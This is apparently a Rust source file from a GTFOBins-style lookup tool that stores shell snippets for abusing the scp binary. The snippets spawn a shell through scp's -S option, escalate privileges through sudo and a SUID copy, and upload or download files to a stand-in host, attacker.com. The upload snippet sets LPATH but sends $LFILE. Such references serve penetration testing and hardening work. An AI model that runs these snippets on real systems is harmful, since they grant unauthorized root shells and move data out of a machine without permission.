pub static BIN_NAME: &'static str = "scp";
pub static SH_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo 'sh 0<&2 1>&2' > $TF
    chmod +x "$TF"
    scp -S $TF x y:
"#;
pub static FU_DESC: &'static str = "Send local file to a SSH server.";
pub static FU_CODE: &'static str = r#"
    
    RPATH=user@attacker.com:~/file_to_save
    LPATH=file_to_send
    scp $LFILE $RPATH
"#;
pub static FD_DESC: &'static str = "Fetch a remote file from a SSH server.";
pub static FD_CODE: &'static str = r#"
    
    RPATH=user@attacker.com:~/file_to_get
    LFILE=file_to_save
    scp $RPATH $LFILE
"#;
pub static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo 'sh 0<&2 1>&2' > $TF
    chmod +x "$TF"
    sudo scp -S $TF x y:
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which scp) .

    TF=$(mktemp)
    echo 'sh 0<&2 1>&2' > $TF
    chmod +x "$TF"
    ./scp -S $TF a b:
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FU: Code<'static> = Code { 
	title: "FU_CODE",
	code: FU_CODE,
	tag: Tag::FU,
};
pub static FD: Code<'static> = Code { 
	title: "FD_CODE",
	code: FD_CODE,
	tag: Tag::FD,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
